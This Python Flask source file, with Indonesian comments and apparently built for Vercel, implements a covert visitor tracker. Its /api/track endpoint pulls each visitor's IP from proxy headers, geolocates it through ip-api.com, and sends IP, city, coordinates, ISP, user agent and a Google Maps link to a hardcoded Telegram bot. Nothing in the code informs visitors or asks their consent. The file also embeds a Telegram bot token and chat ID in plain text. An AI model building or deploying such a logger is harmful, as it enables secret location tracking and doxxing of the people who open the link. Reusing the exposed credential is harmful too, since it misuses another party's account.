from flask import Flask, render_template, request, jsonify
import requests
import json
import os
from datetime import datetime

app = Flask(__name__, 
            template_folder='../templates',
            static_folder='../static')

# ============ KONFIGURASI TELEGRAM ============
TELEGRAM_BOT_TOKEN = "8780073514:AAF4WU_A69EitrlCxx155yNxCwwHz41M__s"
TELEGRAM_CHAT_ID = "6446678808"

print("=" * 50)
print(f"🔥 BOT TOKEN: {TELEGRAM_BOT_TOKEN[:25]}...")
print(f"🔥 CHAT ID: {TELEGRAM_CHAT_ID}")
print("=" * 50)

# ============ FUNCTIONS ============

def get_client_ip():
    """Dapatkan IP client dengan prioritas header proxy"""
    headers_to_check = [
        'X-Forwarded-For',
        'X-Real-IP',
        'CF-Connecting-IP',
        'X-Vercel-Forwarded-For',
        'True-Client-IP',
        'X-Client-IP',
    ]
    
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            ip = ip.split(',')[0].strip()
            if ip and not ip.startswith(('127.', '10.', '192.168.', '172.', '::1')):
                print(f"[DEBUG] IP from {header}: {ip}")
                return ip
    
    ip = request.remote_addr
    if ip and not ip.startswith(('127.', '::1')):
        print(f"[DEBUG] IP from remote_addr: {ip}")
        return ip
    
    print("[DEBUG] No valid IP found, using default")
    return None

def get_ip_info(ip):
    """Ambil info IP dari ip-api.com"""
    try:
        if not ip:
            url = 'http://ip-api.com/json/'
        else:
            url = f'http://ip-api.com/json/{ip}'
        
        fields = 'status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
        response = requests.get(f'{url}?fields={fields}', timeout=10)
        data = response.json()
        
        print(f"[DEBUG] IP API Response: {data.get('status')} - {data.get('query')}")
        return data
        
    except Exception as e:
        print(f"[ERROR] get_ip_info: {e}")
        return {"status": "error", "message": str(e)}

def send_to_telegram(data):
    """Kirim data ke Telegram Bot"""
    
    print(f"[DEBUG] Sending to Telegram...")
    
    # Validasi token
    if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 30:
        print("[ERROR] Bot Token invalid!")
        return False
    
    # Helper function untuk safe value
    def safe(key, default='N/A'):
        val = data.get(key)
        return str(val) if val else default
    
    # Ambil data
    ip_addr = safe('query')
    country = safe('country')
    region = safe('regionName')
    city = safe('city')
    lat = safe('lat')
    lon = safe('lon')
    isp = safe('isp')
    org = safe('org')
    timezone = safe('timezone')
    timestamp = safe('timestamp')
    user_agent = safe('user_agent', 'Unknown')[:200]  # Batasi panjang
    
    # Google Maps link
    if lat != 'N/A' and lon != 'N/A':
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    else:
        maps_link = None
    
    # Format message - SIMPLE tanpa karakter khusus yang bisa error
    message = f"""🔴 NEW VISITOR

📅 Waktu: {timestamp}
🌐 IP: `{ip_addr}`
📍 Lokasi: {city}, {region}, {country}
🗺️ Koordinat: {lat}, {lon}
📡 ISP: {isp}
🏢 Org: {org}
🕐 Timezone: {timezone}

📱 User Agent:
`{user_agent}`"""

    if maps_link:
        message += f"\n\n🗺️ Google Maps: {maps_link}"
    
    # Kirim ke Telegram
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown',
        'disable_web_page_preview': False
    }
    
    try:
        print(f"[DEBUG] Sending request to Telegram API...")
        response = requests.post(url, json=payload, timeout=15)
        result = response.json()
        
        print(f"[DEBUG] Telegram Response: {result}")
        
        if result.get('ok'):
            print("[SUCCESS] Message sent to Telegram!")
            return True
        else:
            error_msg = result.get('description', 'Unknown error')
            print(f"[ERROR] Telegram API Error: {error_msg}")
            
            # Kalau error karena parse_mode, coba tanpa parse_mode
            if 'parse_mode' in error_msg.lower():
                print("[DEBUG] Retrying without parse_mode...")
                payload['parse_mode'] = None
                response2 = requests.post(url, json=payload, timeout=15)
                result2 = response2.json()
                print(f"[DEBUG] Retry Response: {result2}")
                return result2.get('ok', False)
            
            return False
            
    except Exception as e:
        print(f"[ERROR] send_to_telegram exception: {e}")
        return False

def test_telegram_connection():
    """Test koneksi ke Telegram API"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
        response = requests.get(url, timeout=10)
        result = response.json()
        
        if result.get('ok'):
            bot_info = result.get('result', {})
            print(f"[TEST] Bot connected: @{bot_info.get('username')}")
            return True
        else:
            print(f"[TEST] Bot connection failed: {result}")
            return False
    except Exception as e:
        print(f"[TEST] Bot connection error: {e}")
        return False

# ============ ROUTES ============

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    return '', 204

@app.route('/api/track', methods=['GET', 'POST'])
def track():
    """Endpoint untuk tracking visitor"""
    
    print("\n" + "="*50)
    print("[TRACK] New request received")
    
    # Dapatkan IP
    client_ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    print(f"[TRACK] IP: {client_ip}")
    print(f"[TRACK] Referer: {referer}")
    print(f"[TRACK] UA: {user_agent[:100]}...")
    
    # Ambil info IP
    ip_info = get_ip_info(client_ip)
    
    # Tambahkan data
    ip_info['user_agent'] = user_agent
    ip_info['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip_info['detected_ip'] = client_ip
    ip_info['referer'] = referer
    
    # Kirim ke Telegram
    telegram_sent = send_to_telegram(ip_info)
    ip_info['telegram_sent'] = telegram_sent
    
    print(f"[TRACK] Telegram sent: {telegram_sent}")
    print("="*50 + "\n")
    
    return jsonify(ip_info)

@app.route('/api/ip-info', methods=['GET'])
def ip_info_route():
    client_ip = get_client_ip()
    data = get_ip_info(client_ip)
    data['user_agent'] = request.headers.get('User-Agent', 'Unknown')
    data['detected_ip'] = client_ip
    return jsonify(data)

@app.route('/api/test-telegram', methods=['GET'])
def test_telegram():
    """Endpoint untuk test koneksi Telegram"""
    bot_ok = test_telegram_connection()
    
    # Coba kirim test message
    test_data = {
        'query': '8.8.8.8',
        'country': 'United States',
        'regionName': 'California',
        'city': 'Mountain View',
        'lat': '37.4056',
        'lon': '-122.0775',
        'isp': 'Google LLC',
        'org': 'Google Public DNS',
        'timezone': 'America/Los_Angeles',
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_agent': 'Test User Agent'
    }
    
    sent = send_to_telegram(test_data)
    
    return jsonify({
        'bot_connection': bot_ok,
        'test_message_sent': sent,
        'bot_token_valid': len(TELEGRAM_BOT_TOKEN) > 30,
        'chat_id': TELEGRAM_CHAT_ID
    })

# ============ VERCEL HANDLER ============

def handler(event, context):
    return app(event, context)

# ============ MAIN ============

if __name__ == '__main__':
    print("\n" + "="*50)
    print("🚀 STARTING FLASK SERVER")
    print("="*50)
    
    # Test Telegram connection on startup
    test_telegram_connection()
    
    # Run server
    app.run(debug=True, host='0.0.0.0', port=5000)
